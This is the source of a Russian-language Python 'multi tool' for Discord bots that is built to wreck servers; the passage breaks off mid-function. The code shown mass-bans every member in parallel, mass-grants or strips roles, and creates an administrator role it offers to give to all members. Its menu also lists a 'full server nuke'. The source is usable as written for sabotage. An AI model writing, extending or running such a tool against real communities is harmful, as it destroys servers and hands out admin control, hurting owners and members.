import os
import sys
import time
import random
import json
import requests
import subprocess
import string
from colorama import Fore, Style, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Инициализация colorama
init(autoreset=True)

# Глобальные переменные
bot_token = None
color = Fore.CYAN
log_file = "action_log.txt"
MAX_WORKERS = 20  # Увеличено до 20 для максимальной скорости

def clear():
    """Очистка экрана"""
    os.system('cls' if os.name == 'nt' else 'clear')

def new_title(title):
    """Установка заголовка окна"""
    if os.name == 'nt':
        os.system(f'title {title}')

def print_banner(color):
    """Печать баннера"""
    banner = f"""
{color}╔══════════════════════════════════════════════════════════════════════════════╗
{color}║                                                                              ║
{color}║     ██████╗ ███████╗██╗   ██╗ ██████╗ ██╗     ██╗   ██╗                    ║
{color}║     ██╔══██╗██╔════╝██║   ██║██╔═══██╗██║     ██║   ██║                    ║
{color}║     ██████╔╝█████╗  ██║   ██║██║   ██║██║     ██║   ██║                    ║
{color}║     ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║   ██║██║     ██║   ██║                    ║
{color}║     ██║  ██║███████╗ ╚████╔╝ ╚██████╔╝███████╗╚██████╔╝                    ║
{color}║     ╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝ ╚═════╝                     ║
{color}║                                                                              ║
{color}║                         {Fore.WHITE}REVOLV MULTI TOOL v3.0{color}                           ║
{color}║                    {Fore.YELLOW}Discord Bot Utility Suite{color}                            ║
{color}╚══════════════════════════════════════════════════════════════════════════════╝
{color}"""
    print(banner)

def log_action(action, details):
    """Запись лога в файл"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {action}: {details}\n"
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"{Fore.CYAN}📝 Лог записан: {action}")

def generate_random_nickname():
    """Генерация случайного никнейма"""
    chars = string.ascii_letters + string.digits + "#№!/?.,"
    length = random.randint(8, 15)
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_role_name():
    """Генерация случайного названия роли"""
    prefixes = ["Admin", "Mod", "VIP", "Elite", "Pro", "Mega", "Ultra", "Super", "Hyper", "Turbo"]
    suffixes = ["God", "Lord", "King", "Master", "Hero", "Legend", "Star", "Ace", "Pro", "Max"]
    return random.choice(prefixes) + random.choice(suffixes) + str(random.randint(1, 999))

def get_token():
    """Запрос токена бота у пользователя"""
    global bot_token
    print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                      {Fore.WHITE}ВВОД ТОКЕНА БОТА{Fore.YELLOW}                              ║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    print(f"{Fore.CYAN}💡 Токен бота можно получить в Discord Developer Portal")
    print(f"{Fore.CYAN}   https://discord.com/developers/applications")
    print()
    bot_token = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите токен бота{Fore.CYAN}]\n└──╼ {Fore.WHITE}").strip()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не может быть пустым!")
        time.sleep(2)
        return False
    return True

def check_bot_token(token):
    """Проверка токена бота"""
    headers = {'Authorization': f'Bot {token}'}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return True, data
        elif response.status_code == 401:
            return False, "Неверный токен"
        elif response.status_code == 403:
            return False, "Токен не имеет прав бота"
        else:
            return False, f"Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return False, f"Ошибка подключения: {e}"

def check_bot_guilds(token):
    """Проверка серверов бота"""
    headers = {'Authorization': f'Bot {token}'}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            return []
    except:
        return []

def get_guild_members(guild_id, token):
    """Получение списка участников сервера"""
    headers = {'Authorization': f'Bot {token}'}
    try:
        members = []
        after = None
        
        while True:
            url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
            if after:
                url += f'&after={after}'
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code != 200:
                break
                
            batch = response.json()
            if not batch:
                break
                
            members.extend(batch)
            after = batch[-1]['user']['id']
            
            if len(batch) < 1000:
                break
        
        return members
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка получения участников: {e}")
        return []

def get_bans_list(guild_id, token):
    """Получение списка забаненных пользователей"""
    headers = {'Authorization': f'Bot {token}'}
    try:
        url = f'https://discord.com/api/v9/guilds/{guild_id}/bans'
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return response.json()
        else:
            return []
    except:
        return []

def get_channel_messages(guild_id, channel_id, token, limit=100):
    """Получение сообщений из канала"""
    headers = {'Authorization': f'Bot {token}'}
    try:
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit={min(limit, 100)}'
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return response.json()
        else:
            return []
    except:
        return []

def main2():
    """Главное меню"""
    new_title("Revolv MultiTool")
    clear()
    print_banner(color)
    print(f"""
                    {color}<<{Fore.RESET}22{color}>> [{Fore.RESET}Забанить всех{color}]          {color}<<{Fore.RESET}23{color}>> [{Fore.RESET}Выдать роль всем{color}]        {color}<<{Fore.RESET}24{color}>>  [{Fore.RESET}Разбанить пользователя{color}]
                    {color}<<{Fore.RESET}25{color}>> [{Fore.RESET}Список ролей{color}]           {color}<<{Fore.RESET}26{color}>> [{Fore.RESET}Перестройка каналов{color}]      {color}<<{Fore.RESET}27{color}>>  [{Fore.RESET}Создать админ роль{color}]
                    {color}<<{Fore.RESET}28{color}>> [{Fore.RESET}Забрать роль у всех{color}]    {color}<<{Fore.RESET}29{color}>> [{Fore.RESET}Выдать роль 1 человеку{color}]    {color}<<{Fore.RESET}30{color}>>  [{Fore.RESET}Очистить чат{color}]
                    {color}<<{Fore.RESET}31{color}>> [{Fore.RESET}Изменить никнеймы всем{color}]  {color}<<{Fore.RESET}32{color}>> [{Fore.RESET}Полный снос сервера{color}]
    """)
    print(f"{Fore.YELLOW}┌─[{Fore.WHITE}Выберите опцию (22-32){Fore.YELLOW}]")
    choice = input(f"└──╼ {Fore.WHITE}")
    
    if choice == "22":
        ban_all_users()
    elif choice == "23":
        give_role_to_all()
    elif choice == "24":
        unban_user()
    elif choice == "25":
        list_all_roles()
    elif choice == "26":
        rebuild_channels()
    elif choice == "27":
        create_admin_role()
    elif choice == "28":
        remove_role_from_all()
    elif choice == "29":
        give_role_to_one()
    elif choice == "30":
        clear_channel()
    elif choice == "31":
        change_all_nicknames()
    elif choice == "32":
        full_server_nuke()
    else:
        print(f"{Fore.RED}❌ Неверный выбор!")
        time.sleep(2)
        main2()

def process_ban_member(member_data, guild_id, headers):
    """Обработка бана одного участника"""
    try:
        user_id = member_data['user']['id']
        username = member_data['user']['username']
        
        ban_url = f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}'
        ban_response = requests.put(ban_url, headers=headers)
        
        if ban_response.status_code in [200, 204]:
            return True, username, user_id
        else:
            return False, username, f"Код ошибки: {ban_response.status_code}"
    except Exception as e:
        return False, "Unknown", str(e)

def ban_all_users():
    """Бан всех пользователей на сервере"""
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.RED}║                         {Fore.WHITE}ЗАБАНИТЬ ВСЕХ{Fore.RED}                                ║")
    print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⚠️ ВНИМАНИЕ! Вы собираетесь забанить ВСЕХ участников сервера!")
    print(f"{Fore.RED}⛔ Это действие НЕОБРАТИМО!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Получение списка участников...")
    members = get_guild_members(guild_id, bot_token)
    
    if not members:
        print(f"{Fore.RED}❌ Не удалось получить список участников!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.GREEN}📌 Найдено участников: {len(members)}")
    print(f"{Fore.YELLOW}⏳ Начинаю бан (параллельно)...")
    
    banned_count = 0
    failed_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_ban_member, member, guild_id, headers) for member in members]
        
        for i, future in enumerate(as_completed(futures), 1):
            success, username, info = future.result()
            if success:
                banned_count += 1
                print(f"{Fore.GREEN}✅ [{i}/{len(members)}] Забанен: {username}")
                log_action("БАН", f"{username} - Успешно")
            else:
                failed_count += 1
                print(f"{Fore.RED}❌ [{i}/{len(members)}] Не удалось забанить: {username} - {info}")
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Операция завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Забанено: {banned_count}")
    print(f"{Fore.RED}  • Ошибок: {failed_count}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ЗАБАНИТЬ ВСЕХ", f"Всего: {banned_count} успешно, {failed_count} ошибок")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def process_role_member(member_data, guild_id, role_id, headers, action='add'):
    """Обработка выдачи/удаления роли у одного участника"""
    try:
        if 'user' not in member_data:
            return False, "Unknown", "Неверная структура данных"
            
        user_id = str(member_data['user']['id'])
        username = member_data['user']['username']
        
        member_roles = [str(r) for r in member_data.get('roles', [])]
        
        if action == 'add':
            if role_id in member_roles:
                return 'already', username, "Уже имеет роль"
            role_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
            role_response = requests.put(role_url, headers=headers)
        else:  # remove
            if role_id not in member_roles:
                return 'not_have', username, "Не имеет роль"
            role_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
            role_response = requests.delete(role_url, headers=headers)
        
        if role_response.status_code in [200, 204]:
            return True, username, user_id
        else:
            return False, username, f"Код ошибки: {role_response.status_code}"
    except Exception as e:
        return False, "Unknown", str(e)

def give_role_to_all():
    """Выдать роль всем пользователям"""
    clear()
    print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.GREEN}║                         {Fore.WHITE}ВЫДАТЬ РОЛЬ ВСЕМ{Fore.GREEN}                          ║")
    print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    role_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID роли{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not role_id:
        print(f"{Fore.RED}❌ ID роли не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Проверка роли...")
    roles_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    
    if roles_response.status_code == 200:
        roles = roles_response.json()
        role_exists = any(str(role['id']) == str(role_id) for role in roles)
        if not role_exists:
            print(f"{Fore.RED}❌ Роль с ID {role_id} не найдена на сервере!")
            input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
            main2()
            return
    else:
        print(f"{Fore.RED}❌ Не удалось получить список ролей!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⚠️ Вы собираетесь выдать роль ВСЕМ участникам сервера!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Получение списка участников...")
    members = get_guild_members(guild_id, bot_token)
    
    if not members:
        print(f"{Fore.RED}❌ Не удалось получить список участников!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.GREEN}📌 Найдено участников: {len(members)}")
    print(f"{Fore.YELLOW}⏳ Начинаю выдачу роли (параллельно)...")
    
    given_count = 0
    failed_count = 0
    already_have = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_role_member, member, guild_id, role_id, headers, 'add') for member in members]
        
        for i, future in enumerate(as_completed(futures), 1):
            result, username, info = future.result()
            if result == True:
                given_count += 1
                print(f"{Fore.GREEN}✅ [{i}/{len(members)}] Роль выдана: {username}")
                log_action("РОЛЬ ВЫДАНА", f"{username} - Роль ID: {role_id}")
            elif result == 'already':
                already_have += 1
            elif result == False:
                failed_count += 1
                print(f"{Fore.RED}❌ [{i}/{len(members)}] Не удалось выдать роль: {username} - {info}")
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Операция завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Роль выдана: {given_count}")
    print(f"{Fore.YELLOW}  • Уже имели роль: {already_have}")
    print(f"{Fore.RED}  • Ошибок: {failed_count}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ВЫДАТЬ РОЛЬ ВСЕМ", f"Всего: {given_count} успешно, {failed_count} ошибок, {already_have} уже имели роль")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def remove_role_from_all():
    """Забрать роль у всех пользователей"""
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.RED}║                         {Fore.WHITE}ЗАБРАТЬ РОЛЬ У ВСЕХ{Fore.RED}                         ║")
    print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    role_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID роли{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not role_id:
        print(f"{Fore.RED}❌ ID роли не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Проверка роли...")
    roles_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    
    if roles_response.status_code == 200:
        roles = roles_response.json()
        role_exists = any(str(role['id']) == str(role_id) for role in roles)
        if not role_exists:
            print(f"{Fore.RED}❌ Роль с ID {role_id} не найдена на сервере!")
            input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
            main2()
            return
    else:
        print(f"{Fore.RED}❌ Не удалось получить список ролей!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⚠️ Вы собираетесь забрать роль у ВСЕХ участников сервера!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Получение списка участников...")
    members = get_guild_members(guild_id, bot_token)
    
    if not members:
        print(f"{Fore.RED}❌ Не удалось получить список участников!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.GREEN}📌 Найдено участников: {len(members)}")
    print(f"{Fore.YELLOW}⏳ Начинаю удаление роли (параллельно)...")
    
    removed_count = 0
    failed_count = 0
    not_have = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_role_member, member, guild_id, role_id, headers, 'remove') for member in members]
        
        for i, future in enumerate(as_completed(futures), 1):
            result, username, info = future.result()
            if result == True:
                removed_count += 1
                print(f"{Fore.GREEN}✅ [{i}/{len(members)}] Роль удалена: {username}")
                log_action("РОЛЬ УДАЛЕНА", f"{username} - Роль ID: {role_id}")
            elif result == 'not_have':
                not_have += 1
            elif result == False:
                failed_count += 1
                print(f"{Fore.RED}❌ [{i}/{len(members)}] Не удалось удалить роль: {username} - {info}")
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Операция завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Роль удалена: {removed_count}")
    print(f"{Fore.YELLOW}  • Не имели роль: {not_have}")
    print(f"{Fore.RED}  • Ошибок: {failed_count}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ЗАБРАТЬ РОЛЬ У ВСЕХ", f"Всего: {removed_count} успешно, {failed_count} ошибок, {not_have} не имели роль")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def give_role_to_one():
    """Выдать роль 1 человеку"""
    clear()
    print(f"{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.BLUE}║                         {Fore.WHITE}ВЫДАТЬ РОЛЬ 1 ЧЕЛОВЕКУ{Fore.BLUE}                     ║")
    print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    user_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID пользователя{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not user_id:
        print(f"{Fore.RED}❌ ID пользователя не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    role_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID роли{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not role_id:
        print(f"{Fore.RED}❌ ID роли не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    add_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
    role_response = requests.put(add_role_url, headers=headers)
    
    if role_response.status_code in [200, 204]:
        print(f"{Fore.GREEN}✅ Роль успешно выдана пользователю!")
        log_action("ВЫДАТЬ РОЛЬ 1 ЧЕЛОВЕКУ", f"Пользователь ID: {user_id}, Роль ID: {role_id} - Успешно")
    else:
        print(f"{Fore.RED}❌ Не удалось выдать роль! Код: {role_response.status_code}")
        log_action("ВЫДАТЬ РОЛЬ 1 ЧЕЛОВЕКУ НЕ УДАЛОСЬ", f"Пользователь ID: {user_id}, Код ошибки: {role_response.status_code}")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def unban_user():
    """Разбан пользователя"""
    clear()
    print(f"{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.BLUE}║                         {Fore.WHITE}РАЗБАНИТЬ ПОЛЬЗОВАТЕЛЯ{Fore.BLUE}                     ║")
    print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Получение списка забаненных пользователей...")
    bans = get_bans_list(guild_id, bot_token)
    
    if bans:
        print(f"{Fore.GREEN}📌 Найдено забаненных пользователей: {len(bans)}")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
        for i, ban in enumerate(bans[:10], 1):
            user = ban.get('user', {})
            username = user.get('username', 'Неизвестно')
            user_id = user.get('id', 'Нет ID')
            reason = ban.get('reason', 'Без причины')
            print(f"{Fore.WHITE}{i}. {Fore.YELLOW}{username} {Fore.WHITE}(ID: {user_id})")
            print(f"{Fore.CYAN}   Причина: {reason}")
        if len(bans) > 10:
            print(f"{Fore.WHITE}... и еще {len(bans) - 10} пользователей")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════\n")
    
    user_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID пользователя для разбана{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not user_id:
        print(f"{Fore.RED}❌ ID пользователя не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    
    check_url = f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}'
    check_response = requests.get(check_url, headers=headers)
    
    if check_response.status_code == 404:
        print(f"{Fore.YELLOW}⚠️ Пользователь не найден в бане или не забанен!")
        log_action("РАЗБАН НЕ УДАЛСЯ", f"ID: {user_id} - Пользователь не в бане")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    unban_url = f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}'
    unban_response = requests.delete(unban_url, headers=headers)
    
    if unban_response.status_code in [200, 204]:
        print(f"{Fore.GREEN}✅ Пользователь успешно разбанен!")
        log_action("РАЗБАН", f"ID: {user_id} - Успешно")
    else:
        print(f"{Fore.RED}❌ Не удалось разбанить пользователя! Код: {unban_response.status_code}")
        log_action("РАЗБАН НЕ УДАЛСЯ", f"ID: {user_id} - Код ошибки: {unban_response.status_code}")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def list_all_roles():
    """Список всех ролей на сервере"""
    clear()
    print(f"{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.MAGENTA}║                         {Fore.WHITE}СПИСОК ВСЕХ РОЛЕЙ{Fore.MAGENTA}                         ║")
    print(f"{Fore.MAGENTA}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Не удалось получить список ролей! Код: {response.status_code}")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    roles = response.json()
    roles.sort(key=lambda x: x.get('position', 0), reverse=True)
    
    print(f"{Fore.GREEN}📌 Найдено ролей: {len(roles)}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    for i, role in enumerate(roles, 1):
        role_name = role.get('name', 'Без названия')
        role_id = role.get('id', 'Нет ID')
        
        permissions = role.get('permissions', '0')
        try:
            perm_int = int(permissions)
            is_admin = "Да" if (perm_int & 8) == 8 else "Нет"
        except:
            is_admin = "Нет"
        
        is_managed = "Да" if role.get('managed', False) else "Нет"
        
        print(f"{Fore.WHITE}{i:3}. {Fore.YELLOW}{role_name}")
        print(f"{Fore.CYAN}     • ID: {role_id}")
        print(f"{Fore.CYAN}     • Право Администратор: {Fore.GREEN if is_admin == 'Да' else Fore.RED}{is_admin}")
        print(f"{Fore.CYAN}     • Управляемая: {Fore.GREEN if is_managed == 'Да' else Fore.RED}{is_managed}")
        print()
    
    log_action("СПИСОК РОЛЕЙ", f"Получено {len(roles)} ролей на сервере {guild_id}")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def create_admin_role():
    """Создание роли с правами администратора"""
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.RED}║                         {Fore.WHITE}СОЗДАТЬ АДМИН РОЛЬ{Fore.RED}                           ║")
    print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    role_name = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите название роли (по умолчанию 'Admin'){Fore.CYAN}]\n└──╼ {Fore.WHITE}") or "Admin"
    
    print(f"{Fore.YELLOW}⏳ Создание роли с правами администратора...")
    
    create_role_data = {
        "name": role_name,
        "permissions": 8,
        "color": 0,
        "hoist": False,
        "mentionable": True
    }
    
    create_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    create_response = requests.post(create_url, headers=headers, json=create_role_data)
    
    if create_response.status_code in [200, 201]:
        role_data = create_response.json()
        role_id = role_data.get('id')
        role_name_created = role_data.get('name')
        
        print(f"{Fore.GREEN}✅ Роль успешно создана!")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
        print(f"{Fore.GREEN}📌 Название роли: {role_name_created}")
        print(f"{Fore.GREEN}📌 ID роли: {role_id}")
        print(f"{Fore.GREEN}📌 Права: Администратор (Да)")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
        
        log_action("СОЗДАНА АДМИН РОЛЬ", f"Создана роль {role_name_created} (ID: {role_id}) с правами администратора")
        
        print()
        give_to_all = input(f"{Fore.CYAN}Выдать эту роль всем участникам? (ДА/НЕТ): {Fore.WHITE}")
        
        if give_to_all.upper() == "ДА":
            print(f"{Fore.YELLOW}⏳ Начинаю выдачу роли всем участникам...")
            
            members = get_guild_members(guild_id, bot_token)
            
            if not members:
                print(f"{Fore.RED}❌ Не удалось получить список участников!")
            else:
                given_count = 0
                failed_count = 0
                already_have = 0
                
                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                    futures = [executor.submit(process_role_member, member, guild_id, str(role_id), headers, 'add') for member in members]
                    
                    for future in as_completed(futures):
                        result, username, info = future.result()
                        if result == True:
                            given_count += 1
                            print(f"{Fore.GREEN}✅ Роль выдана: {username}")
                        elif result == 'already':
                            already_have += 1
                        else:
                            failed_count += 1
                            print(f"{Fore.RED}❌ Не удалось выдать роль: {username} - {info}")
                
                print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
                print(f"{Fore.GREEN}✅ Выдача роли завершена!")
                print(f"{Fore.CYAN}📊 Статистика:")
                print(f"{Fore.GREEN}  • Роль выдана: {given_count}")
                print(f"{Fore.YELLOW}  • Уже имели роль: {already_have}")
